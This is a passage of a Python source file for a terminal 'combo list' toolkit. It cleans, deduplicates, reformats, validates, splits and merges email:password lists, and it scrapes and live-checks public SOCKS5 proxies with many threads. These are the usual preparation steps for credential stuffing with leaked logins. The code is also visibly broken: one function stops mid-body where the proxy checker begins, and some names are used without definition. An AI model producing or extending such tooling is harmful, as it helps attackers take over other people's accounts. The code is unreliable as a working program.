    print(f"  {Fore.WHITE}   Thanks for using {BRAND} {TOOL}! - {OWNER}{Fore.RESET}")
    print(f"  {Fore.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}\n")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

class LoadingAnimation:
    def show_spinner(self, message, duration=2):
        with console.status(f"[cyan]{message}[/cyan]", spinner="dots"):
            time.sleep(duration)

    def progress_bar(self, total, desc="Loading"):
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task(f"[cyan]{desc}", total=total)
            while not progress.finished:
                progress.update(task, advance=1)
                time.sleep(0.1)

    def hacker_loading(self, message="Initializing System"):
        frames = ["▓", "▒", "░", "▒", "▓"]
        colors = ["red", "green", "blue", "yellow", "magenta", "cyan"]
        for i in range(10):
            color = colors[i % len(colors)]
            frame = frames[i % len(frames)]
            console.print(f"[{color}][{frame*20}][/{color}] {message}", end="\r")
            time.sleep(0.1)
        console.print()

class WelcomeScreen:
    @staticmethod
    def show():
        os.system('cls' if os.name == 'nt' else 'clear')
       
        banner = pyfiglet.figlet_format(f"{BRAND}", font="slant")
        console.print(f"[bright_cyan]{banner}[/bright_cyan]")

        console.print(Panel(
    f"[bold yellow]{TOOL}[/bold yellow] by [bold cyan]{OWNER}[/bold cyan]\n"
    f"[dim]Powerful toolkit for cleaning and managing combo lists and it was created by {BRAND}[/dim]",
            border_style="bright_blue",
            box=box.HEAVY_EDGE,
            width=60
        ))

        features = [
            "✓ 40+ powerful combo editing tools",
            "✓ Remove URLs & duplicates",
            "✓ Fix password format",
            "✓ Split & merge files",
            "✓ Email validation & domain filtering",
            "✓ Password strength analysis",
            "✓ Case conversion & shuffling",
            "✓ Character cleanup",
            "✓ Statistics & reporting",
            "✓ Proxy checker",
            "✓ Undo last operation",
            "✓ And many more..."
        ]
        console.print("\n[bold bright_green]✨ FEATURES:[/bold bright_green]")
        for feature in features:
            console.print(f"  [green]{feature}[/green]")

        anim = LoadingAnimation()
        anim.hacker_loading(f"Loading {TOOL}")
        time.sleep(1)

def select_input_file(prompt="Select a combo file", folder="Combo"):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    target_folder = os.path.join(script_dir, folder)
    
    if not os.path.exists(target_folder):
        os.makedirs(target_folder, exist_ok=True)
        console.print(f"[green]📁 Created '{folder}' folder. Place your .txt files there.[/green]")
        input("Press Enter to continue...")
        return None

    txt_files = [f for f in os.listdir(target_folder) if f.endswith('.txt')]
    if not txt_files:
        console.print(f"[red]✘ No .txt files found in the '{folder}' folder.[/red]")
        return None

    file_data = []
    for i, file in enumerate(txt_files):
        file_path = os.path.join(target_folder, file)
        try:
            size_bytes = os.path.getsize(file_path)
            size_kb = size_bytes / 1024
            size_display = f"{size_kb/1024:.2f} MB" if size_kb >= 1024 else f"{size_kb:.2f} KB"
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                line_count = sum(1 for line in f if line.strip())
            file_data.append({
                "index": i + 1,
                "filename": file,
                "size_display": size_display,
                "lines": line_count,
                "path": file_path
            })
        except Exception as e:
            console.print(f"[yellow]⚠️  Could not read {file}: {e}[/yellow]")
            continue

    if not file_data:
        console.print(f"[red]✘ No valid files could be read.[/red]")
        return None

    table = Table(show_header=True, header_style="bold cyan", box=box.HEAVY_EDGE, title=f"[bold yellow]📁 {prompt}[/bold yellow]", border_style="bright_blue")
    table.add_column("#", style="dim white", width=4)
    table.add_column("File Name", style="white", no_wrap=True)
    table.add_column("Size", style="green")
    table.add_column("Lines", style="magenta")

    for item in file_data:
        table.add_row(
            str(item['index']),
            item['filename'],
            item['size_display'],
            f"{item['lines']:,}"
        )

    console.print()
    console.print(table)
    console.print()

   
    while True:
        try:
            choice = Prompt.ask(f"[bold cyan]Enter file number (1-{len(file_data)})[/bold cyan]")
            choice_idx = int(choice) - 1
            if 0 <= choice_idx < len(file_data):
                selected = file_data[choice_idx]
                break
            else:
                console.print(f"[red]✘ Invalid! Choose 1-{len(file_data)}[/red]")
        except ValueError:
            console.print(f"[red]✘ Please enter a valid number[/red]")
        except KeyboardInterrupt:
            console.print(f"\n[yellow]⚠️  Cancelled by user[/yellow]")
            return None

    
    preview_lines = []
    try:
        with open(selected['path'], 'r', encoding='utf-8', errors='ignore') as f:
            for _ in range(3):
                line = f.readline().strip()
                if line:
                    preview_lines.append(line[:50] + ('...' if len(line) > 50 else ''))
    except Exception:
        preview_lines = ["[Could not read preview]"]

    preview_panel = Panel(
        f"[bold green]✔ SELECTED FILE[/bold green]\n\n"
        f"[white]Name :[/white] [yellow]{selected['filename']}[/yellow]\n"
        f"[white]Size :[/white] [green]{selected['size_display']}[/green]\n"
        f"[white]Lines:[/white] [magenta]{selected['lines']:,}[/magenta]\n\n"
        f"[white]Preview:[/white]\n" + "\n".join([f"  [dim]{line}[/dim]" for line in preview_lines]),
        border_style="bright_cyan",
        box=box.HEAVY,
        width=70
    )
    console.print(preview_panel)
    console.print()

    return selected['path']

def ensure_results_dir():
    results_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Results")
    os.makedirs(results_dir, exist_ok=True)
    return results_dir

def create_backup(file_path):
    global backup_folder
    backup_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Backups")
    os.makedirs(backup_folder, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_name = f"{os.path.basename(file_path)}_{timestamp}.bak"
    backup_path = os.path.join(backup_folder, backup_name)
    shutil.copy2(file_path, backup_path)
    return backup_path

def undo_last_operation(original_file):
    global backup_folder
    if not backup_folder or not os.path.exists(backup_folder):
        console.print("[red]No backup folder found.[/red]")
        return False
    backups = [f for f in os.listdir(backup_folder) if f.endswith('.bak') and f.startswith(os.path.basename(original_file))]
    if not backups:
        console.print("[red]No backups found for this file.[/red]")
        return False
    backups.sort(reverse=True)
    latest = backups[0]
    backup_path = os.path.join(backup_folder, latest)
    shutil.copy2(backup_path, original_file)
    console.print(f"[green]Restored from backup: {latest}[/green]")
    return True

def read_combo_lines(file_path):
    lines = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line:
                lines.append(line)
    return lines

def write_combo_lines(file_path, lines):
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines))

def is_valid_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def extract_email_part(line):
    if ':' in line:
        return line.split(':', 1)[0].strip()
    return None

def extract_password_part(line):
    if ':' in line:
        return line.split(':', 1)[1].strip()
    return None

def get_domain(email):
    if '@' in email:
        return email.split('@')[1].lower()
    return None

def remove_urls(file_path):
    lines = read_combo_lines(file_path)
    cleaned_lines = []
    modified_count = 0
    url_pattern = r'^(?:https?://)?(?:[\w-]+\.)+[\w-]+(?:/[^:]*)?:*'
    colon_pattern = r'^:+'
    
    for line in lines:
        if ':' in line:
            cleaned = re.sub(url_pattern, '', line)
            cleaned = re.sub(colon_pattern, '', cleaned)
            if ':' in cleaned:
                if cleaned != line:
                    modified_count += 1
                cleaned_lines.append(cleaned)
            else:
                cleaned_lines.append(line)
        else:
            cleaned_lines.append(line)
    
    results_dir = ensure_results_dir()
    base = os.path.splitext(os.path.basename(file_path))[0]
    out = os.path.join(results_dir, f"{base}_no_urls.txt")
    write_combo_lines(out, cleaned_lines)
    
    console.print(Panel(
        f"[bold green]✅ URL Removal Complete[/bold green]\n\n"
        f"[white]Total lines:[/white] {len(lines)}\n"
        f"[white]Modified:[/white] {modified_count}\n"
        f"[white]Saved to:[/white] [underline]{out}[/underline]",
        border_style="green"
    ))

def remove_duplicates(file_path):
    lines = read_combo_lines(file_path)
    original = len(lines)
    unique = list(dict.fromkeys(lines))
    new = len(unique)
    removed = original - new
    
    results_dir = ensure_results_dir()
    base = os.path.splitext(os.path.basename(file_path))[0]
    out = os.path.join(results_dir, f"{base}_no_dupes.txt")
    write_combo_lines(out, unique)
    
    console.print(Panel(
        f"[bold green]✅ Duplicates Removed[/bold green]\n\n"
        f"[white]Original:[/white] {original}\n"
        f"[white]New:[/white] {new}\n"
        f"[white]Removed:[/white] {removed}\n"
        f"[white]Saved to:[/white] [underline]{out}[/underline]",
        border_style="green"
    ))

def fix_password_format(file_path):
    lines = read_combo_lines(file_path)
    fixed = []
    modified = 0
    skipped = 0
    allowed = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
    
    for line in lines:
        if ':' not in line:
            skipped += 1
            continue
        email, pwd = line.split(':', 1)
        if all(c in allowed for c in pwd):
            if len(pwd) >= 6:
                if not any(c.isupper() for c in pwd):
                    for i, ch in enumerate(pwd):
                        if ch.isalpha():
                            pwd = pwd[:i] + ch.upper() + pwd[i+1:]
                            modified += 1
                            break
                fixed.append(f"{email}:{pwd}")
            else:
                skipped += 1
        else:
            skipped += 1
    
    results_dir = ensure_results_dir()
    base = os.path.splitext(os.path.basename(file_path))[0]
    out = os.path.join(results_dir, f"{base}_fixed.txt")
    write_combo_lines(out, fixed)
    
    console.print(Panel(
        f"[bold green]✅ Password Format Fix[/bold green]\n\n"
        f"[white]Total lines:[/white] {len(lines)}\n"
        f"[white]Fixed:[/white] {len(fixed)}\n"
        f"[white]Modified (caps added):[/white] {modified}\n"
        f"[white]Skipped:[/white] {skipped}\n"
        f"[white]Saved to:[/white] [underline]{out}[/underline]",
        border_style="green"
    ))

def split_combo_file(file_path):
    lines = read_combo_lines(file_path)
    total = len(lines)
    if total == 0:
        console.print("[red]No lines to split.[/red]")
        return
    
    split_size = Prompt.ask("[bold cyan]Lines per file[/bold cyan]", default="1000")
    try:
        split_size = int(split_size)
        if split_size <= 0:
            raise ValueError
    except:
        console.print("[red]Invalid number.[/red]")
        return
    
    num_files = math.ceil(total / split_size)
    results_dir = ensure_results_dir()
    base = os.path.splitext(os.path.basename(file_path))[0]
    out_dir = os.path.join(results_dir, f"{base}_split")
    os.makedirs(out_dir, exist_ok=True)
    
    with Progress(SpinnerColumn(), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), console=console) as prog:
        task = prog.add_task("[cyan]Splitting...", total=num_files)
        for i in range(num_files):
            start = i * split_size
            end = min((i+1)*split_size, total)
            out_file = os.path.join(out_dir, f"{base}_{i+1}.txt")
            write_combo_lines(out_file, lines[start:end])
            prog.update(task, advance=1)
    
    console.print(Panel(
        f"[bold green]✅ File Split[/bold green]\n\n"
        f"[white]Total lines:[/white] {total}\n"
        f"[white]Files created:[/white] {num_files}\n"
        f"[white]Output folder:[/white] [underline]{out_dir}[/underline]",
        border_style="green"
    ))

def merge_combo_files():
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    combo_folder = os.path.join(script_dir, "Combo")
    if not os.path.exists(combo_folder):
        console.print("[red]Combo folder not found.[/red]")
        return
    
    txt_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]
    if not txt_files:
        console.print("[red]No .txt files found.[/red]")
        return
    
    console.print("[bold cyan]Select files to merge (enter numbers separated by commas):[/bold cyan]")
    for i, f in enumerate(txt_files, 1):
        console.print(f"  {i}. {f}")
    
    choice = Prompt.ask("[bold cyan]File numbers[/bold cyan]")
    indices = []
    for part in choice.split(','):
        try:
            idx = int(part.strip()) - 1
            if 0 <= idx < len(txt_files):
                indices.append(idx)
        except:
            pass
    if not indices:
        console.print("[red]No valid files selected.[/red]")
        return
    
    selected_files = [os.path.join(combo_folder, txt_files[i]) for i in indices]
    
    merged_lines = []
    for fpath in selected_files:
        merged_lines.extend(read_combo_lines(fpath))
    
    remove_dupes = Confirm.ask("[bold yellow]Remove duplicates after merge?[/bold yellow]", default=True)
    if remove_dupes:
        merged_lines = list(dict.fromkeys(merged_lines))
    
    results_dir = ensure_results_dir()
    out_name = f"merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    out_path = os.path.join(results_dir, out_name)
    write_combo_lines(out_path, merged_lines)
    
    console.print(Panel(
        f"[bold green]✅ Merge Complete[/bold green]\n\n"
        f"[white]Files merged:[/white] {len(selected_files)}\n"
        f"[white]Total lines:[/white] {len(merged_lines)}\n"
        f"[white]Output:[/white] [underline]{out_path}[/underline]",
        border_style="green"
    ))

def email_validation(file_path):
    lines = read_combo_lines(file_path)
    valid = []
    invalid = []
    for line in lines:
        if ':' not in line:
            invalid.append(line)
            continue
        email = extract_email_part(line)
        if email and is_valid_email(email):
            valid.append(line)
        else:
            invalid.append(line)
    
    results_dir = ensure_results_dir()
    base = os.path.splitext(os.path.basename(file_path))[0]
    valid_out = os.path.join(results_dir, f"{base}_valid_emails.txt")
    invalid_out = os.path.join(results_dir, f"{base}_invalid_emails.txt")
    write_combo_lines(valid_out, valid)
    write_combo_lines(invalid_out, invalid)
    
    console.print(Panel(
        f"[bold green]✅ Email Validation[/bold green]\n\n"
        f"[white]Total:[/white] {len(lines)}\n"
        f"[white]Valid emails:[/white] {len(valid)}\n"
        f"[white]Invalid emails:[/white] {len(invalid)}\n"
        f"[white]Valid saved:[/white] [underline]{valid_out}[/underline]\n"
        f"[white]Invalid saved:[/white] [underline]{invalid_out}[/underline]",
        border_style="green"
    ))

def empty_password_check(file_path):
    lines = read_combo_lines(file_path)
    good = []
    empty = []
    missing_sep = []
    for line in lines:
        if ':' not in line:
            missing_sep.append(line)
        else:
            pwd = extract_password_part(line)
            if pwd == "":
                empty.append(line)
            else:
                good.append(line)
    
    results_dir = ensure_results_dir()
    base = os.path.splitext(os.path.basename(file_path))[0]
    good_out = os.path.join(results_dir, f"{base}_good.txt")
    empty_out = os.path.join(results_dir, f"{base}_empty_pass.txt")
    missing_out = os.path.join(results_dir, f"{base}_missing_sep.txt")
    write_combo_lines(good_out, good)
    write_combo_lines(empty_out, empty)
    write_combo_lines(missing_out, missing_sep)
    
    console.print(Panel(
        f"[bold green]✅ Empty/Missing Check[/bold green]\n\n"
        f"[white]Total:[/white] {len(lines)}\n"
        f"[white]Good:[/white] {len(good)}\n"
        f"[white]Empty password:[/white] {len(empty)}\n"
        f"[white]Missing separator:[/white] {len(missing_sep)}",
        border_style="green"
    ))

def case_normalization(file_path):
    lines = read_combo_lines(file_path)
    normalized = []
    for line in lines:
        if ':' in line:
            email, pwd = line.split(':', 1)
            email = email.lower()
            normalized.append(f"{email}:{pwd}")
        else:
            normalized.append(line.lower())
    results_dir = ensure_results_dir()
    base = os.path.splitext(os.path.basename(file_path))[0]
    out = os.path.join(results_dir, f"{base}_lowercase.txt")
    write_combo_lines(out, normalized)
    console.print(f"[green]Case normalization (emails lowercased). Saved to {out}[/green]")

def domain_extraction_filter(file_path):
    lines = read_combo_lines(file_path)
    domain_lines = {}
    unknown = []
    for line in lines:
        email = extract_email_part(line)
        if email and '@' in email:
            domain = get_domain(email)
            if domain:
                domain_lines.setdefault(domain, []).append(line)
            else:
                unknown.append(line)
        else:
            unknown.append(line)
    
    total = len(lines)
    domain_counts = {d: len(domain_lines[d]) for d in domain_lines}
    
    if Confirm.ask("[bold yellow]Do you want to filter out specific domains?[/bold yellow]", default=False):
        console.print("[cyan]Enter domains to remove (comma separated, e.g. mailinator.com,10minutemail.com)[/cyan]")
        blacklist = Prompt.ask("[bold cyan]Blacklist domains[/bold cyan]").strip().lower().split(',')
        blacklist = [b.strip() for b in blacklist if b.strip()]
        filtered = []
        for line in lines:
            email = extract_email_part(line)
            if email and '@' in email:
                domain = get_domain(email)
                if domain not in blacklist:
                    filtered.append(line)
            else:
                filtered.append(line)
        results_dir = ensure_results_dir()
        base = os.path.splitext(os.path.basename(file_path))[0]
        out = os.path.join(results_dir, f"{base}_filtered.txt")
def run_proxy_checker():
    import requests
    import threading
    from queue import Queue
    from urllib.parse import urlparse

    def fetch_proxies_from_source(url, proxy_type="socks5"):
        proxies = []
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                lines = resp.text.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if ':' in line:
                        proxies.append(line)
        except:
            pass
        return proxies

    console.print(Panel("[bold cyan]Proxy Generator + Checker (Multi-Source)[/bold cyan]", border_style="bright_blue"))
    sources = [
        ("https://www.proxy-list.download/api/v1/get?type=socks5", "socks5"),
        ("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", "socks5"),
        ("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt", "socks5"),
        ("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", "socks5"),
    ]
    all_proxies = []
    console.print("[yellow]Fetching proxies from multiple sources...[/yellow]")
    for url, ptype in sources:
        prox = fetch_proxies_from_source(url)
        console.print(f"[dim]Got {len(prox)} from {url}[/dim]")
        all_proxies.extend(prox)
    all_proxies = list(set(all_proxies))
    random.shuffle(all_proxies)
    console.print(f"[green]Total unique proxies: {len(all_proxies)}[/green]")
    limit = int(Prompt.ask("[cyan]How many to check? (max 200)[/cyan]", default="50"))
    if limit > len(all_proxies):
        limit = len(all_proxies)
    to_check = all_proxies[:limit]
    proxy_queue = Queue()
    for p in to_check:
        proxy_queue.put(p)
    lock = threading.Lock()
    valid = []
    invalid = []
    def check_one():
        while not proxy_queue.empty():
            proxy = proxy_queue.get()
            try:
                proxies = {
                    "http": f"socks5://{proxy}",
                    "https": f"socks5://{proxy}"
                }
                r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
                if r.status_code == 200:
                    with lock:
                        valid.append(proxy)
                        console.print(f"[green]{proxy} - ALIVE[/green]")
                else:
                    with lock:
                        invalid.append(proxy)
                        console.print(f"[red]{proxy} - DEAD[/red]")
            except:
                with lock:
                    invalid.append(proxy)
                    console.print(f"[red]{proxy} - DEAD[/red]")
            proxy_queue.task_done()
    threads = []
    for _ in range(30):
        t = threading.Thread(target=check_one)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    os.makedirs("results", exist_ok=True)
    with open("results/valid_proxies.txt", "w") as f:
        for p in valid:
            f.write(p + "\n")
    with open("results/invalid_proxies.txt", "w") as f:
        for p in invalid:
            f.write(p + "\n")
    console.print(f"[green]Valid: {len(valid)}, Invalid: {len(invalid)}. Saved to results/[/green]")
    input(f"\n{Colors.YELLOW}➤ Press Enter to return to menu...{Colors.RESET}")         
if __name__ == "__main__":
    main_menu()
